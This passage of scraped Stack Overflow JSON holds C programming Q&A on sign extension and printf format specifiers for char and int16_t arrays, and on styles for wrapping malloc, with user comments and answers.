"comment_id": 51082105, "body": "@Michael: <code>char</code> is only sign-extended if it is signed actually. That is implementation defined (but apparently true for OP&#39;s implementation)."}, {"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1437603872, "post_id": 31562375, "comment_id": 51104982, "body": "integral promotion is performed <b>because the compiler doesn&#39;t know the formal argument type</b> (here because it is varargs, also happens when a prototype is lacking)."}], "answers": [{"comments": [{"owner": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "edited": false, "score": 0, "creation_date": 1437569943, "post_id": 31562645, "comment_id": 51083278, "body": "<code>They&#39;re the same because they&#39;re all different representations of -1.</code> So regardless of the type i should observe the compared values as their decimal representation?"}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "reply_to_user": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "edited": false, "score": 0, "creation_date": 1437603019, "post_id": 31562645, "comment_id": 51104625, "body": "@Alan: let me expand on that in the answer."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437603482, "post_id": 31562645, "comment_id": 51104826, "body": "Use <code>&quot;%hhx&quot;</code> to cause the value to be cast to <code>unsigned char</code> before printing."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437603539, "post_id": 31562645, "comment_id": 51104846, "body": "&quot;So it can contain values in the range -127 to +127.&quot;  Hmmm, more likely -128 to +127."}, {"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437603702, "post_id": 31562645, "comment_id": 51104911, "body": "@chux: For an 8-bit extended integral type, only -127 to +127 would be required (sign-magnitude representation is permitted).  But for <code>char</code> and <code>signed char</code>, indeed every bit pattern is required to have a distinguishable value (no -0 vs +0 issue) in order to satisfy the roundtripping requirement, so yes it should be <code>-128</code> to <code>+127</code> (if <code>CHAR_BIT == 8</code>)."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437603782, "post_id": 31562645, "comment_id": 51104952, "body": "With exact width types, code should us matching format specifiers from <code>&lt;inttypes.h&gt;</code>: <code>printf(&quot;%&quot; PRIx16 &quot; \\n&quot;, array1[0]);</code>"}, {"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437603819, "post_id": 31562645, "comment_id": 51104964, "body": "@chux: There&#39;s no way to pass anything smaller than <code>int</code> to <code>printf</code>, btw."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1437604081, "post_id": 31562645, "comment_id": 51105073, "body": "@Ben Voigt Hmmmm, On a theoretical machine with 4-byte <code>int</code> and 2-byte <code>char *</code>, what would happen with <code>printf(&quot;%s&quot;, &quot;Hello&quot;)</code>?   Maybe a wide integer embedded processor with limited memory?  Is that case,  something smaller than <code>int</code> is passed to <code>printf()</code>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1437604166, "post_id": 31562645, "comment_id": 51105110, "body": "Steve Summit @Ben point is correct that a signed <code>char</code> would have a minimal range of -127 to 127.  My point was what OP likely has."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437604362, "post_id": 31562645, "comment_id": 51105189, "body": "@chux: Oh, yes, I know about 1&#39;s complement and sign/magnitude.  But when I typed &quot;-127&quot;, it was a typo, not a deliberate acknowledgement of the other representations, because if I was acknowledging the other representations, I would have said -32767 just above."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437605041, "post_id": 31562645, "comment_id": 51105441, "body": "@Steve Summit Subtle deduction: Minimum <code>int16_t</code> must be -32768 and not -32767.  Since code has <code>int16_t</code>, it <i>must</i> be 16-bit 2&#39;s complement capable (and no padding), and <i>certainly</i> 2&#39;s complement for <code>char</code> be it 8 or 16 bit, padded or not, signed or unsigned.  Things are more complex when code mixes base types with exact width ones - Sigh."}, {"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1437605786, "post_id": 31562645, "comment_id": 51105680, "body": "char cannot be padded and must have 2**CHAR_BIT unique values. No sign magnitude or ones complement allowed."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1437607708, "post_id": 31562645, "comment_id": 51106176, "body": "It should be clarified that the out-of-range assignment is <i>implementation-defined</i> and it&#39;s theoretically possible that some systems will store a different value than <code>-1</code>"}], "tags": [], "owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "is_accepted": true, "score": 5, "last_activity_date": 1437604230, "last_edit_date": 1437604230, "creation_date": 1437566784, "answer_id": 31562645, "question_id": 31562375, "link": "https://stackoverflow.com/questions/31562375/char-and-int16-array-element-both-shown-as-32bit-hex/31562645#31562645", "title": "Char and int16 array element both shown as 32bit hex?", "body": "<p>They're the same because they're all different representations of -1.</p>\n\n<p>They print as 32 bits' worth of <code>ff</code> becaue you're on a 32-bit machine and you used <code>%d</code> and the <em>default argument promotions</em> took place (basically, everything smaller gets promoted to <code>int</code>).  Try using <code>%hx</code>.  (That'll probably get you <code>ffff</code>; I don't know of a way to get <code>ff</code> here other than by using <code>unsigned char</code>, or masking with <code>&amp; 0xff</code>: <code>printf(\"%x \\n\", array2[0] &amp; 0xff)</code> .)</p>\n\n<hr>\n\n<p>Expanding on \"They're the same because they're all different representations of -1\":</p>\n\n<p><code>int16_t</code> is a signed 16-bit type.  It can contain values in the range -32768 to +32767.<br>\n<code>char</code> is an 8-bit type, and on your machine it's evidently signed also.  So it can contain values in the range -128 to +127.</p>\n\n<p>0xff is decimal 255, a value which can't be represented in a signed char.  If you assign 0xff to a signed char, that bit pattern ends up getting interpreted not as 255, but rather as -1.  (Similarly, if you assigned 0xfe, that would be interpreted not as 254, but rather as -2.)</p>\n\n<p>0xffff is decimal 65535, a value which can't be represented in an <code>int16_t</code>.  If you assign 0xffff to a <code>int16_t</code>, that bit pattern ends up getting interpreted not as 65535, but rather as -1.  (Similarly, if you assigned 0xfffe, that would be interpreted not as 65534, but rather as -2.)</p>\n\n<p>So when you said</p>\n\n<pre><code>int16_t array1[] = {0xffff,0xffff,0xffff,0xffff};\n</code></pre>\n\n<p>it was basically just as if you'd said</p>\n\n<pre><code>int16_t array1[] = {-1,-1,-1,-1};\n</code></pre>\n\n<p>And when you said</p>\n\n<pre><code>char array2[] = {0xff,0xff,0xff,0xff};\n</code></pre>\n\n<p>it was just as if you'd said</p>\n\n<pre><code>char array2[] = {-1,-1,-1,-1};\n</code></pre>\n\n<p>So that's why <code>*array1 == *array2</code>, and <code>array1[0] == array2[0]</code>.</p>\n\n<hr>\n\n<p>Also, it's worth noting that all of this is very much because of the types of <code>array1</code> and <code>array2</code>.  If you instead said</p>\n\n<pre><code>uint16_t array3[] = {0xffff,0xffff,0xffff,0xffff};\nunsigned char array4[] = {0xff,0xff,0xff,0xff};\n</code></pre>\n\n<p>You would see different values printed (<code>ffff</code> and <code>ff</code>), and the values from <code>array3</code> and <code>array4</code> would not compare the same.</p>\n\n<p>Another answer stated that \"there is no type information in C at runtime\".  That's true but misleading in this case.  When the compiler generates code to manipulate values from <code>array1</code>, <code>array2</code>, <code>array3</code>, and <code>array4</code>, the code it generates (which of course <em>is</em> significant at runtime!) will be based on their types.  In particular, when generating code to fetch values from <code>array1</code> and <code>array2</code> (but <em>not</em> <code>array3</code> and <code>array4</code>), the compiler will use instructions which perform <em>sign extension</em> when assigning to objects of larger type (e.g. 32 bits).  That's how 0xff and 0xffff got changed into 0xffffffff.</p>\n"}, {"comments": [{"owner": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "edited": false, "score": 0, "creation_date": 1437567721, "post_id": 31562675, "comment_id": 51081623, "body": "Does <code>no type information in C at runtime</code> imply that the compared elements (<code>(*array1 == *array2</code>)  are also cast to some default type before comparison?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "edited": false, "score": 1, "creation_date": 1437567976, "post_id": 31562675, "comment_id": 51081792, "body": "Technically, that&#39;s not even a cast any more <i>at runtime</i> as there aren&#39;t any types, just bytes of data ;) But yes, from the compiler&#39;s view, comparing 2 integers of different sizes means converting the smaller one to the same size as the bigger one."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": false, "score": 1, "last_activity_date": 1437567169, "last_edit_date": 1437567169, "creation_date": 1437566845, "answer_id": 31562675, "question_id": 31562375, "link": "https://stackoverflow.com/questions/31562375/char-and-int16-array-element-both-shown-as-32bit-hex/31562675#31562675", "title": "Char and int16 array element both shown as 32bit hex?", "body": "<p>Because there is no type information in C <em>at runtime</em> and by using a plain <code>%x</code> for printing, you tell <code>printf</code> that your pointer points to an <code>unsigned int</code>. Poor library function just trusts you ... see <strong>Length modifier</strong> in <a href=\"http://man7.org/linux/man-pages/man3/printf.3.html\" rel=\"nofollow\"><code>printf(3)</code></a> for how to give <code>printf</code> the information it needs.</p>\n"}, {"tags": [], "owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "is_accepted": false, "score": 1, "last_activity_date": 1437608125, "last_edit_date": 1495540694, "creation_date": 1437608125, "answer_id": 31575793, "question_id": 31562375, "link": "https://stackoverflow.com/questions/31562375/char-and-int16-array-element-both-shown-as-32bit-hex/31575793#31575793", "title": "Char and int16 array element both shown as 32bit hex?", "body": "<p>Using <code>%x</code> to print negative values causes <a href=\"https://stackoverflow.com/questions/2397984/undefined-unspecified-and-implementation-defined-behavior\">undefined behaviour</a> so you should not assume that there is anything sensible about what you are seeing.  </p>\n\n<p>The correct format specifier for <code>char</code> is <code>%hhd</code>, and for <code>int16_t</code> it is <code>\"%\" PRId16</code>.  You will need <code>#include &lt;inttypes.h&gt;</code> to get the latter macro.</p>\n\n<p>Because of the <em>default argument promotions</em>, it is also correct to use <code>%d</code> with <code>char</code> and <code>int16_t</code> <SUP>1</SUP>.  If you change your code to use <code>%d</code> instead of <code>%x</code>, it will no longer exhibit undefined behaviour, and the results will make sense.</p>\n\n<hr>\n\n<p><SUP>1</SUP> The C standard doesn't actually say that, but it's assumed that that was the intent of the writers.</p>\n"}], "owner": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 311, "favorite_count": 0, "accepted_answer_id": 31562645, "answer_count": 3, "score": 1, "last_activity_date": 1437608125, "creation_date": 1437566111, "last_edit_date": 1437603771, "question_id": 31562375, "link": "https://stackoverflow.com/questions/31562375/char-and-int16-array-element-both-shown-as-32bit-hex", "title": "Char and int16 array element both shown as 32bit hex?", "body": "<p>In the example below:</p>\n\n<pre><code>int main(int argc, char *argv[])\n{\n    int16_t array1[] = {0xffff,0xffff,0xffff,0xffff};\n    char array2[] = {0xff,0xff,0xff,0xff};\n    printf(\"Char size: %d \\nint16_t size: %d \\n\", sizeof(char), sizeof(int16_t));\n\n    if (*array1 == *array2)\n        printf(\"They are the same \\n\");\n    if (array1[0] == array2[0])\n        printf(\"They are the same \\n\");\n\n    printf(\"%x \\n\", array1[0]);\n    printf(\"%x \\n\", *array1);\n\n    printf(\"%x \\n\", array2[0]);\n    printf(\"%x \\n\", *array2);\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Char size: 1 \nint16_t size: 2 \nThey are the same \nThey are the same \nffffffff \nffffffff \nffffffff \nffffffff\n</code></pre>\n\n<p>Why are the 32bit values printed for both <code>char</code> and <code>int16_t</code> and why can they be compared and are considered the same?</p>\n"}, {"tags": ["c", "malloc"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1437565657, "post_id": 31562156, "comment_id": 51080097, "body": "It&#39;s up to you. Both methods are correct."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1437565770, "post_id": 31562156, "comment_id": 51080186, "body": "BTW don&#39;t cast the return value of malloc in C, so actually the first method is useless, just use <code>a = malloc(4)</code> instead of <code>a = malloc_string(4)</code>"}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 3, "creation_date": 1437565884, "post_id": 31562156, "comment_id": 51080258, "body": "A common reason for using the pattern in method 2 is for the function to return an error code, rather than being <code>void</code>."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2698462"}, "edited": false, "score": 0, "creation_date": 1437566582, "post_id": 31562274, "comment_id": 51080750, "body": "Thanks! Of course in practice, I will add checks on parms, this piece of code is just to describe the question briefly."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437566716, "post_id": 31562274, "comment_id": 51080846, "body": "@AttufliX That&#39;s why I mentioned my statements in &quot;nitpick&quot;. :-)"}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 1, "last_activity_date": 1437565790, "last_edit_date": 1495541649, "creation_date": 1437565790, "answer_id": 31562274, "question_id": 31562156, "link": "https://stackoverflow.com/questions/31562156/malloc-memory-to-char-in-function-return-char-or-pass-char-as-function-pa/31562274#31562274", "title": "Malloc memory to char * in function. Return *char or pass char ** as function parameter?", "body": "<p>To answer <em>this</em> question, <strong>TL;DR</strong>, any one. Both are OK.</p>\n\n<p>To nitpick, NONE, because</p>\n\n<ol>\n<li><p>Both the methods lack error check. What's the use of the wrapper then?</p>\n\n<p>1.1. If I pass <code>string_size</code> as a -ve value, <code>malloc()</code> will blow up.</p>\n\n<p>1.2. <code>malloc()</code> failure (or, success) should be checked before using the returned pointer.</p></li>\n<li>Please <a href=\"https://stackoverflow.com/q/605845/2173917\">see why not to cast</a> the return value of <code>malloc()</code> and family in <code>C</code>.</li>\n</ol>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2698462"}, "edited": false, "score": 0, "creation_date": 1437566333, "post_id": 31562347, "comment_id": 51080582, "body": "So, malloc within a callable function is bad? You mean you would malloc for pointer first and then pass the pointer to function?"}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1437566416, "post_id": 31562347, "comment_id": 51080638, "body": "No that&#39;s fine. But I&#39;d never stub <code>malloc</code> for the sake of it. Just don&#39;t lose track of the returned pointer."}], "tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 2, "last_activity_date": 1437566008, "creation_date": 1437566008, "answer_id": 31562347, "question_id": 31562156, "link": "https://stackoverflow.com/questions/31562156/malloc-memory-to-char-in-function-return-char-or-pass-char-as-function-pa/31562347#31562347", "title": "Malloc memory to char * in function. Return *char or pass char ** as function parameter?", "body": "<p>Neither: both are terrible.</p>\n\n<ol>\n<li><p>Don't have stub functions for <code>malloc</code> since your code becomes less clear to folk reading your code. (<code>malloc</code> is a standard function and everyone knows what it does.)</p></li>\n<li><p>And don't cast <code>malloc</code> on the right hand side of <code>=</code>: it's bad programming style since (i) you are repeating yourself and (ii) someone refactoring your code might change the pointer type in one and not the other place. That can introduce undefined behaviour.</p></li>\n</ol>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2698462"}, "edited": false, "score": 0, "creation_date": 1437567912, "post_id": 31562385, "comment_id": 51081749, "body": "You are right, malloc receives size_t params. I think enabling compiler warnings is a good habit."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": false, "score": 1, "last_activity_date": 1437566144, "last_edit_date": 1495540271, "creation_date": 1437566144, "answer_id": 31562385, "question_id": 31562156, "link": "https://stackoverflow.com/questions/31562156/malloc-memory-to-char-in-function-return-char-or-pass-char-as-function-pa/31562385#31562385", "title": "Malloc memory to char * in function. Return *char or pass char ** as function parameter?", "body": "<p>The correct way in C would be to never define an <code>malloc_string()</code> in the first place, it just introduces an unnecessary (and, hopefully optimized-away) function call. Just do this:</p>\n\n<pre><code>a = malloc(4);\n</code></pre>\n\n<p>See also <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">Do I cast the result of malloc?</a></p>\n\n<p>Apart from that, your argument type is wrong, it must be <code>size_t</code>, not <code>int</code> (and your compiler should warn you about this, enable compiler warnings)</p>\n\n<p>Finally, you should probably define a <em>single</em> wrapper around <code>malloc</code> to handle errors in a central place ... in it's simplest form, it would look like this:</p>\n\n<pre><code>void *xmalloc(size_t size)\n{\n    void *ret;\n    if (!(ret = malloc(size))\n    {\n        /* perror(\"malloc\"); */\n        exit(1);\n    }\n    return ret;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2698462"}, "edited": false, "score": 0, "creation_date": 1437585085, "post_id": 31569537, "comment_id": 51094392, "body": "Yeah, not properly free the pointer or use an already freed pointer may cause many headache problems. Setting NULL to freed yet pointer and using assert is really a good habit. Tks!"}], "tags": [], "owner": {"reputation": 779, "user_id": 2379079, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hyI9I.png?s=128&g=1", "display_name": "Alex", "link": "https://stackoverflow.com/users/2379079/alex"}, "is_accepted": false, "score": 0, "last_activity_date": 1437584410, "creation_date": 1437584410, "answer_id": 31569537, "question_id": 31562156, "link": "https://stackoverflow.com/questions/31562156/malloc-memory-to-char-in-function-return-char-or-pass-char-as-function-pa/31569537#31569537", "title": "Malloc memory to char * in function. Return *char or pass char ** as function parameter?", "body": "<p>The only thing is worth substituting is free(), the C standard doesn't say that after freeing the memory the pointer has to be NULLed;</p>\n\n<pre><code>#define SAFE_FREE(m)    \\\n{                       \\\n   if(m)                \\\n   {                    \\\n      free(m);          \\\n      m = NULL;         \\\n   }                    \\\n}\n</code></pre>\n\n<p>A good practice is to NULL the freed pointer, that will help to catch potential problems earlier aspesially if you have a habit to use assert for every internal functions, like this:</p>\n\n<pre><code>void foo_internal(void* p)\n{\n   assert(p != NULL);\n\n   // ...\n}\n</code></pre>\n\n<p>If you do not NULL the pointer after freeing it and call the func the assert will never be triggered on the most compilers and platforms (memory allocation are platform specific).</p>\n\n<p>That might seem not a big deal if you have IDE debugger and can step through the code but in some cases, like UEFI, embedded, etc. where you don't have a debugger that simple practice would save a lot of headache!</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user2698462"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 506, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1437616571, "creation_date": 1437565487, "last_edit_date": 1437616571, "question_id": 31562156, "link": "https://stackoverflow.com/questions/31562156/malloc-memory-to-char-in-function-return-char-or-pass-char-as-function-pa", "title": "Malloc memory to char * in function. Return *char or pass char ** as function parameter?", "body": "<pre><code>char *a = NULL;\nchar *b = NULL;\n</code></pre>\n\n<p><strong>Method 1:</strong></p>\n\n<pre><code>char *malloc_string(int string_size){\n    return (char*)malloc(string_size);\n}\n\na=malloc_string(4);\n\nfree(a);\n</code></pre>\n\n<p><strong>Method 2:</strong></p>\n\n<pre><code>void malloc_string(char **a, int string_size){\n    *a = (char*)malloc(string_size);\n}\n\nmalloc_string(&amp;b, 4);\n\nfree(b);\n</code></pre>\n\n<p>Which would you choose and why?</p>\n"}, {"tags": ["c", "file"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1437564414, "post_id": 31561761, "comment_id": 51079272, "body": "&quot;Similar to standard FILE object&quot; : similar in which way ? What are you trying to achieve ?"}, {"owner": {"reputation": 245145, "user_id": 1348195, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/f6dca2295546af21e1cde8e68f2d49bd?s=128&d=identicon&r=PG", "display_name": "Benjamin Gruenbaum", "link": "https://stackoverflow.com/users/1348195/benjamin-gruenbaum"}, "edited": false, "score": 0, "creation_date": 1437564550, "post_id": 31561761, "comment_id": 51079353, "body": "C does not have objects, so there&#39;s that for starters. You can &quot;create&quot; references to files by calling functions that open files or work with files for instance - <code>fopen</code>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 245145, "user_id": 1348195, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/f6dca2295546af21e1cde8e68f2d49bd?s=128&d=identicon&r=PG", "display_name": "Benjamin Gruenbaum", "link": "https://stackoverflow.com/users/1348195/benjamin-gruenbaum"}, "edited": false, "score": 1, "creation_date": 1437565287, "post_id": 31561761, "comment_id": 51079838, "body": "@BenjaminGruenbaum of course does C have objects. This wording is even used in the standard. It doesn&#39;t have objects having (in an OOP-style) functionality <i>attached</i> to them, but that&#39;s easily doable using some conventions."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 2, "creation_date": 1437565401, "post_id": 31561761, "comment_id": 51079923, "body": "It really depends on what you mean by &quot;similar&quot;.  If you mean, &quot;create pointers of type <code>FILE *</code> that I can read from and write to&quot;, then yes, you absolutely can, as discussed in the answer by @paddy.  If you mean &quot;Arrange for there to be new, preopened file pointers just like <code>stdin</code> and <code>stdout</code> that are automatically there, that I don&#39;t have to explicitly open or even declare&quot;, you either can&#39;t do that, or it would require modifying the compiler and standard libraries."}, {"owner": {"reputation": 1307, "user_id": 1515891, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9QW8T.jpg?s=128&g=1", "display_name": "spt025", "link": "https://stackoverflow.com/users/1515891/spt025"}, "edited": false, "score": 1, "creation_date": 1437566072, "post_id": 31561761, "comment_id": 51080398, "body": "Kindly refer to metastackoverflow to learn how to ask questions and avoid getting downvotes .. You are quite new here so would strongly suggest you. And not downvoting because you are quite new"}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "reply_to_user": {"reputation": 1307, "user_id": 1515891, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9QW8T.jpg?s=128&g=1", "display_name": "spt025", "link": "https://stackoverflow.com/users/1515891/spt025"}, "edited": false, "score": 1, "creation_date": 1437566449, "post_id": 31561761, "comment_id": 51080661, "body": "This article is helpful, for the second point made by @spt025 : <a 